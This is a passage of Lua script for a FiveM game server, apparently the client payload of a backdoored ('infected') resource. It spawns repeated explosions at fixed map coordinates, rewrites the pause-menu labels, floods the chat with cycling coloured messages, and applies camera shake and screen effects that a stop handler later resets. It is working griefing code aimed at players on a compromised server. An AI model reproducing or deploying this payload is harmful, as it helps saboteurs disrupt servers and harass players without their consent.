		   AddExplosion(798.91400146484,573.09936523438,141.43251037598, 5, 0, true, true, 1)
		   AddExplosion(763.54248046875,443.96780395508,147.18112182617, 5, 0, true, true, 1)
		   AddExplosion(923.92071533203,528.46606445313,119.71677398682, 5, 0, true, true, 1)
		   AddExplosion(689.03399658203,554.13507080078,191.7236328125, 5, 0, true, true, 1)
		   AddExplosion(670.30090332031,565.64129638672,272.06759643555, 5, 0, true, true, 1)
		   AddExplosion(563.84466552734,475.48455810547,171.69914245605, 5, 0, true, true, 1)
		   AddExplosion(651.19805908203,576.09906005859,129.05094909668, 5, 0, true, false, 1)
		   AddExplosion(695.63061523438,554.13635253906,132.46676635742, 5, 0, true, false, 1)
		   AddExplosion(680.24377441406,620.59802246094,170.31489562988, 5, 0, true, false, 1)
		   AddExplosion(798.91400146484,573.09936523438,141.43251037598, 5, 0, true, false, 1)
		   AddExplosion(763.54248046875,443.96780395508,147.18112182617, 5, 0, true, false, 1)
		   AddExplosion(923.92071533203,528.46606445313,119.71677398682, 5, 0, true, false, 1)
		   AddExplosion(689.03399658203,554.13507080078,191.7236328125, 5, 0, true, false, 1)
		   AddExplosion(670.30090332031,565.64129638672,272.06759643555, 5, 0, true, false, 1)
		   AddExplosion(563.84466552734,475.48455810547,171.69914245605, 5, 0, true, false, 1)
		   AddExplosion(651.19805908203,576.09906005859,129.05094909668, 2, 0, true, true, 1)
		   AddExplosion(695.63061523438,554.13635253906,132.46676635742, 2, 0, true, true, 1)
		   AddExplosion(680.24377441406,620.59802246094,170.31489562988, 2, 0, true, true, 1)
		   AddExplosion(798.91400146484,573.09936523438,141.43251037598, 2, 0, true, true, 1)
		   AddExplosion(763.54248046875,443.96780395508,147.18112182617, 2, 0, true, true, 1)
		   AddExplosion(923.92071533203,528.46606445313,119.71677398682, 2, 0, true, true, 1)
		   AddExplosion(689.03399658203,554.13507080078,191.7236328125, 2, 0, true, true, 1)
		   AddExplosion(670.30090332031,565.64129638672,272.06759643555, 2, 0, true, true, 1)
		   AddExplosion(563.84466552734,475.48455810547,171.69914245605, 2, 0, true, true, 1)
		   AddExplosion(651.19805908203,576.09906005859,129.05094909668, 2, 0, true, false, 1)
		   AddExplosion(695.63061523438,554.13635253906,132.46676635742, 2, 0, true, false, 1)
		   AddExplosion(680.24377441406,620.59802246094,170.31489562988, 2, 0, true, false, 1)
		   AddExplosion(798.91400146484,573.09936523438,141.43251037598, 2, 0, true, false, 1)
		   AddExplosion(763.54248046875,443.96780395508,147.18112182617, 2, 0, true, false, 1)
		   AddExplosion(923.92071533203,528.46606445313,119.71677398682, 2, 0, true, false, 1)
		   AddExplosion(689.03399658203,554.13507080078,191.7236328125, 2, 0, true, false, 1)
		   AddExplosion(670.30090332031,565.64129638672,272.06759643555, 2, 0, true, false, 1)
		   AddExplosion(563.84466552734,475.48455810547,171.69914245605, 2, 0, true, false, 1)
	   end
	end)

	Citizen.CreateThread(function()
	   AddTextEntry('PM_SCR_MAP', config["MAP"])
	   AddTextEntry('PM_SCR_STA', config["STATUS"])
	   AddTextEntry('PM_SCR_GAM', config["GAME"])
	   AddTextEntry('PM_SCR_INF', config["INFO"])
	   AddTextEntry('PM_SCR_SET', config["SETTINGS"])
	   AddTextEntry('PM_SCR_RPL', config["R*EDITOR"])
	end)

	Citizen.CreateThread(function()
	   local i = 1
	   local j = 1
	   while true do
		   Citizen.Wait(50)
		   if(chatspam)then
			   TriggerEvent('chat:addMessage', {
				   color = chatColors[i],
				   multiline = true,
				   args = {texts[j]}
			   })
			   if(chatColors[i+1] ~= nil)then
				   i = i+1
			   else
				   i = 1
			   end
			   if(texts[j+1] ~= nil)then
				   j = j+1
			   else
				   j = 1
			   end
		   end
	   end
	end)


	AddEventHandler('onResourceStop', function(resourceName) -- stop's the infected resource with the backdoor
	   if (GetCurrentResourceName() ~= resourceName) then
		 return
	   end
	   print('The resource ' .. resourceName .. ' was stopped.')
	   ShakeGameplayCam("SKY_DIVING_SHAKE", 0.0)
	   SetFakeWantedLevel(0)
	   StopScreenEffect("RaceTurbo")
	end)
end)